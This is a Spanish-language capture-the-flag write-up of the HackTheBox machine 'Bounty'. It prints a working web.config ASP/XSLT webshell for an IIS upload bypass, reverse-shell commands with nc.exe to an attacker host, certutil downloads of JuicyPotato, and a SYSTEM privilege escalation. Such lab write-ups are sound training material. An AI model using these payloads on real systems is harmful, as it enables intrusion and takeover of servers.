---
title: HackTheBox - Bounty
author: cotes
date: 2023-09-12 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'File Upload', 'SeImpersonatePrivilege (Juicy Potato)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Bounty/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Bounty Machine Logo
---

Máquina Windows de nivel **Easy** de HackThBox.

Técnicas usadas: **File Upload, SeImpersonatePrivilege (Juicy Potato)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Bounty/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p21,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Bounty/02-versions.png)

> Internet Information Services (IIS) es un conjunto de servicios para Windows. Las extensiones más 'conocidas' son **.aspx** y **.aspx**
{: .prompt-tip }

c. Enumeramos por fichero con las extensiones más conocidas

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.93/ -t 100 -x aspx,asp --add-slash

/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles/       (Status: 403) [Size: 1233] -> Directorio en el que se guardarán los archivos
```


![](/assets/images/HTB/Easy/Bounty/03-file.png)

* En este caso no podemos subir una **webshell** en formato '.asp' y '.aspx' por lo que buscamos una forma de bypassear esto [Bypass File Upload](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

d. Podemos ejecutar comandos 'camuflando' el script en un archivo **web.config**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
set xmldoc= Server.CreateObject("MSXML2.DOMDocument")
xml="<?xml version=""1.0""?><root >cmd /c ipconfig</root>"
xmldoc.loadxml(xml)
Set xsldoc = Server.CreateObject("MSXML2.DOMDocument")
xlst="<?xml version='1.0'?><xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh""><msxsl:script language=""JScript"" implements-prefix=""zcg""> function xml(x) {var a=new ActiveXObject('wscript.shell'); var exec=a.Exec(x);return exec.StdOut.ReadAll()+exec.StdErr.ReadAll(); }</msxsl:script><xsl:template match=""/root""> <xsl:value-of select=""zcg:xml(string(.))""/></xsl:template></xsl:stylesheet>"
xsldoc.loadxml(xlst)
response.write "<pre><xmp>" & xmldoc.TransformNode(xsldoc)& "</xmp></pre>"
%>
```

* Subimos este fichero y veremos el output del comando **ipconfig**

    ![](/assets/images/HTB/Easy/Bounty/04-command.png)

e. Ahora nos entablaremos una reverse shell

* Primero, descargamos [nc](https://eternallybored.org/misc/netcat/) y montamos un servidor smb con impacket

    ```bash
    ❯ impacket-smbserver Share ./ -smb2support
    ```

* Ahora, el comando que ejecutaremos es `\\10.10.14.18\Share\nc.exe -e cmd 10.10.14.18 443`, subimos el fichero web.config y recibiremos una **reverse shell**

    ```bash
    ❯ nc -lvnp 443
    connect to [10.10.14.18] from (UNKNOWN) [10.10.10.93] 49169
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    c:\windows\system32\inetsrv>
    ```

### Escalada de Privilegios 💹

a. Vemos nuestro privilegios

```cmd
c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

> El tener este privilegio habilitado para un usuario lo hace vulnerable a una escalada de privilegios con **Juicy Potato**
{: .prompt-info }

b. Para esto necesitamos los ficheros [Juicy Potato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) y [nc64](https://eternallybored.org/misc/netcat/) y los transferimos a la máquina víctima

```bash
❯ python -m http.server 80
------------------------------------------------------------------------------------
C:\Users\merlin\Documents>certutil -f -urlcache -split "http://<tun0 IP>/JuicyPotato.exe" ".\JuicyPotato.exe"
C:\Users\merlin\Documents>certutil -f -urlcache -split "http://<tun0 IP>/nc64.exe" ".\nc64.exe"
```

c. Ahora, nos entablamos una reverse shell 

```cmd
C:\Users\merlin\Documents>.\JuicyPotato.exe -t * -l 4445 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\merlin\Documents\nc64.exe -e cmd <tun0 IP> 4444"
----------------------------------------------------------------------------------------------------------------------------------------------------------
❯ nc -lvnp 4444
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```